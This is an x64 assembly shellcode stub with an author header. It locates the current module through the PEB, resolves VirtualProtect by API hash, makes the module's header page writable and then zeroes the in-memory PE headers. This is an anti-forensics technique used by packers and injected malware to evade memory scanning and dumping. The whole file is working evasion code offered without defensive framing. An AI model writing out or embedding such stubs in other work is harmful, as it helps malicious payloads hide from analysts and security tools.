;-----------------------------------------------------------------------------;
; Author: Ege Balcı <ege.balci[at]invictuseurope[dot]com>
; Compatible: Windows 10/8.1/8/7/2008/Vista/2003/XP/2000/NT4
; Version: 1.0 (25 January 2018)
; Size: 177 bytes
;-----------------------------------------------------------------------------;


[BITS 64]

  	xor rax,rax             ; Zero EAX (upper 3 bytes will remain zero until function is found)
  	mov rbx,[gs:rax+96]     ; Get a pointer to the PEB
  	mov rbx,[rbx+24]        ; Get PEB->Ldr
	mov rbx,[rbx+32]        ; Get the first module from the InMemoryOrder module list
	mov rbx,[rbx+32]        ; Get this modules base address
	call block_api
	%include "../block_api.asm"
block_api:
	pop rbp                 ; Get the address of block_api to RBP
	push dword 0x00         ; OldProtect
	mov rcx,rsp             ; lpflOldProtect
	mov rdx,qword 0x04      ; flNewProtect (PAGE_READWRITE)
	mov r8,qword 0x1010     ; dwSize
	mov r9,rbx              ; lpAddress (RBX)
	mov r10d,0xC38AE110     ; hash( "KERNEL32.dll", "VirtualProtect" )
	call rbp                ; VirtualProtect()
	mov rcx,qword 0x1000    ; sizeof(PE_HEADERS)
wipe:
	mov qword [rbx],0x00    ; Wipe 1 byte
	inc rbx                 ; Increase RBX pointer
	loop wipe               ; Loop until RCX == 0
	ret                     ; <-
